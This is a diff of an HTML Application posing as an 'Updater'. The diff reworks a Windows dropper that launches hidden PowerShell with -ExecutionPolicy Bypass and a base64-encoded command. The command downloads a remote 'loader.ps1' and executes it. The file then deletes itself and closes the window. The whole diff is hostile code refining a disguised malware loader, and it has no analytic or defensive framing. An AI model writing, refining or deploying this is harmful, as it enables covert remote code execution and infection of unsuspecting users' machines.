@@ -1,30 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <hta:application
-    id="Updater"
-    applicationname="Updater"
-    border="thin"
-    borderstyle="complex"
-    caption="no"
-    sysmenu="no"
-    scroll="no"
-    singleinstance="yes"
-    windowstate="minimize"
-    showintaskbar="no"
-  />
+  <hta:application … />
   <title>Updater</title>
   <script language="VBScript">
-    ' === In-memory PowerShell stub ===
     Dim sh: Set sh = CreateObject("WScript.Shell")
-    sh.Run "powershell -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA", 0, False
+    Dim psPath, cmd
+    psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
+    cmd    = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
+    sh.Run Chr(34) & psPath & Chr(34) & " " & cmd, 0, False
 
-    ' Self-delete
-    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
-    fso.DeleteFile WScript.ScriptFullName, True
+    ' Delete self & close
+    Dim htaPath, fso
+    htaPath = document.location.pathname
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    fso.DeleteFile htaPath, True
+    self.close
   </script>
 </head>
-<body>
-  <!-- Nothing to see here -->
-</body>
+<body></body>
 </html>
